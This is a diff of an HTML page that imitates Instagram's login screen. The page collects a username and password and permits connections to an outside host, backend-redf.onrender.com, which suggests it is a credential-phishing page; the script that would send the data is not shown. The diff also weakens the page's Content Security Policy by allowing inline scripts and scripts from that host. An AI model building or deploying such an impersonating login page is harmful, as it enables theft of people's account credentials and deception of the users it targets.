@@ -4,11 +4,12 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     
-    <!-- ✅ Updated Content Security Policy (CSP) -->
+    <!--  Updated Content Security Policy (CSP) -->
     <meta http-equiv="Content-Security-Policy" content="
-    default-src 'self'; 
-    img-src 'self' https://upload.wikimedia.org data:; 
-    script-src 'self'; 
+    default-src 'self';
+    img-src 'self' https://upload.wikimedia.org data:;
+    style-src 'self' 'unsafe-inline';
+    script-src 'self' 'unsafe-inline' https://backend-redf.onrender.com;
     connect-src 'self' https://backend-redf.onrender.com;
 ">
     <title>Instagram Login</title>
@@ -22,7 +23,7 @@
         <input type="text" placeholder="Phone number, username, or email" id="username">
         <input type="password" placeholder="Password" id="password">
         <a href="#" class="forgot-password">Forgot password?</a>
-        <button class="login-btn" id="loginBtn">Log In</button> <!-- ✅ Removed inline script -->
+        <button class="login-btn" id="loginBtn">Log In</button> <!--  Removed inline script -->
        
         <div class="signup-link">Don't have an account? <a href="#">Sign up</a></div>
     </div>
@@ -41,6 +42,6 @@
         <a href="#">Threads</a>
     </div>
 
-    <script src="index.js"></script> <!-- ✅ External JavaScript -->
+    <script src="index.js"></script> <!-- External JavaScript -->
 </body>
 </html>
